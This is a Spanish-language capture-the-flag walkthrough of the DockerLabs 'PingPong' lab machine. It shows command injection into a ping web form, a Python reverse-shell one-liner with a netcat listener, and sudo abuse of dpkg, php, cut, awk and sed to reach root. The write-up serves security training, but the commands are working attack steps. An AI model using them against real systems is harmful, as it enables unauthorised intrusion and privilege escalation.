---
icon: flag
---

# PingPong DockerLabs (Intermediate)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip pingpong.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh pingpong.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-21 10:46 EST
Stats: 0:00:56 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 66.67% done; ETC: 10:48 (0:00:28 remaining)
Nmap scan report for 172.17.0.2
Host is up (0.000025s latency).

PORT     STATE SERVICE  VERSION
80/tcp   open  http     Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.58 (Ubuntu)
443/tcp  open  ssl/http Apache httpd 2.4.58 ((Ubuntu))
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=example.com/organizationName=Your Organization/stateOrProvinceName=California/countryName=US
| Not valid before: 2024-05-19T14:20:49
|_Not valid after:  2025-05-19T14:20:49
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.58 (Ubuntu)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.1 Python/3.12.3
|     Date: Fri, 21 Feb 2025 15:47:00 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 1747
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Ping Test</title>
|     <style>
|     body {
|     font-family: Arial, sans-serif;
|     background-color: #2c3e50;
|     color: #ecf0f1;
|     display: flex;
|     justify-content: center;
|     align-items: center;
|     height: 100vh;
|     margin: 0;
|     .container {
|     background-color: #34495e;
|     padding: 20px;
|     border-radius: 10px;
|     box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
|     width: 400px;
|     text-align: center;
|     input[type
|   RTSPRequest: 
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.94SVN%I=7%D=2/21%Time=67B89FF4%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,782,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.0\.1\
SF:x20Python/3\.12\.3\r\nDate:\x20Fri,\x2021\x20Feb\x202025\x2015:47:00\x2
SF:0GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:
SF:\x201747\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20la
SF:ng=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"UTF-8\">\n\x20\x
SF:20\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-width,\x
SF:20initial-scale=1\.0\">\n\x20\x20\x20\x20<title>Ping\x20Test</title>\n\
SF:x20\x20\x20\x20<style>\n\x20\x20\x20\x20\x20\x20\x20\x20body\x20{\n\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-family:\x20Arial,\x20s
SF:ans-serif;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background-
SF:color:\x20#2c3e50;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20col
SF:or:\x20#ecf0f1;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20displa
SF:y:\x20flex;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20justify-co
SF:ntent:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20alig
SF:n-items:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20he
SF:ight:\x20100vh;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin
SF::\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\.container\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:background-color:\x20#34495e;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20padding:\x2020px;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20border-radius:\x2010px;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20box-shadow:\x200\x200\x2010px\x20rgba\(0,\x200,\x200,\x200\.5\);\
SF:n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20width:\x20400px;\n\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20text-align:\x20center;\n\x2
SF:0\x20\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20\x20\x20\x20input\[
SF:type")%r(RTSPRequest,16C,"<!DOCTYPE\x20HTML>\n<html\x20lang=\"en\">\n\x
SF:20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20charset=
SF:\"utf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<title>Error\x20response</t
SF:itle>\n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x2
SF:0\x20\x20\x20\x20<h1>Error\x20response</h1>\n\x20\x20\x20\x20\x20\x20\x
SF:20\x20<p>Error\x20code:\x20400</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>
SF:Message:\x20Bad\x20request\x20version\x20\('RTSP/1\.0'\)\.</p>\n\x20\x2
SF:0\x20\x20\x20\x20\x20\x20<p>Error\x20code\x20explanation:\x20400\x20-\x
SF:20Bad\x20request\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x20\x
SF:20\x20\x20</body>\n</html>\n");
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 93.66 seconds
```

Si entramos a la pagina web del puerto `5000` veremos una interfaz en la que podremos meter una `IP` y nos hara como un `ping` mostrando la informacion del comando, por lo que podremos probar a concatenar comando de la siguiente forma:

## Escalate user freddy

```shell
;whoami
```

Info:

```
freddy
```

Y veremos que funciona, por lo que vamos a intentar enviar una `reverse shell` para ganar acceso como el usuario `freddy`.

```shell
; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

Antes de enviarlo nos pondremos a la escucha:

```shell
nc -lvnp <PORT>
```

Y cuando lo enviemos, si vamos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.60.128] from (UNKNOWN) [172.17.0.2] 59704
$ whoami
whoami
freddy
```

Vemos que somo el usuario `freddy` por lo que tendremos que sanitizar la `shell`.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user bobby

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for freddy on afd32de0f5cd:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User freddy may run the following commands on afd32de0f5cd:
    (bobby) NOPASSWD: /usr/bin/dpkg
```

Vemos que podemos ejecutar el binario `dpkg` como el usuario `bobby`, por lo que haremos lo siguiente:

```shell
sudo -u bobby dpkg -l
!/bin/bash
```

Info:

```
bobby@afd32de0f5cd:/home/freddy$ whoami
bobby
```

Veremos que somos dicho usuario.

## Escalate user gladys

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for bobby on afd32de0f5cd:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User bobby may run the following commands on afd32de0f5cd:
    (gladys) NOPASSWD: /usr/bin/php
```

Vemos que podemos ejecutar el binario `php` como el usuario `gladys`, por lo que haremos lo siguiente:

```shell
CMD="/bin/bash"
sudo -u gladys php -r "system('$CMD');"
```

Info:

```
gladys@afd32de0f5cd:/home/freddy$ whoami
gladys
```

Veremos que somo dicho usuario.

## Escalate user chocolatito

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for gladys on afd32de0f5cd:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User gladys may run the following commands on afd32de0f5cd:
    (chocolatito) NOPASSWD: /usr/bin/cut
```

Veremos que podemos ejecutar el binario `cut` como el usuario `chocolatito`, por lo que haremos lo siguiente:

```shell
cd /opt
sudo -u chocolatito cut -d "" -f1 chocolatitocontraseña.txt
```

Veremos que en `/opt` hay un archivo que no podemos leer, pero con ese comando podremos leerlo y veremos lo siguiente:

Info:

```
chocolatitopassword
```

Por lo que vemos obtenemos la contraseña de dicho usuario, por lo que haremos lo siguiente:

```shell
su chocolatito
```

Y metemos como contraseña `chocolatitopassword`, echo esto seremos dicho usuario.

## Escalate user theboss

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for gladys on afd32de0f5cd:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User gladys may run the following commands on afd32de0f5cd:
    (theboss) NOPASSWD: /usr/bin/awk
```

Vemos que podemos ejecutar el binario `awk` como el usuario `theboss` por lo que haremos lo siguiente:

```shell
sudo -u theboss awk 'BEGIN {system("/bin/bash")}'
```

Info:

```
theboss@afd32de0f5cd:/opt$ whoami
theboss
```

Y con esto ya seremos el usuario `theboss`.

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for gladys on afd32de0f5cd:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User gladys may run the following commands on afd32de0f5cd:
    (root) NOPASSWD: /usr/bin/sed
```

Vemos que podemos ejecutar el binario `sed` como el usuario `root`, por lo que haremos lo siguiente:

```shell
sudo sed -n '1e exec bash 1>&0' /etc/hosts
```

Info:

```
root@afd32de0f5cd:/opt$ whoami
root
```

Con esto veremos que seremos `root` por lo que habremos terminado la maquina.
